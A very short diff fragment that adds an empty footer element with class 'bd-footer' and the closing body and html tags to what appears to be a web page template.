+  <footer class="bd-footer">
+  </footer>
+  </body>
+</html>
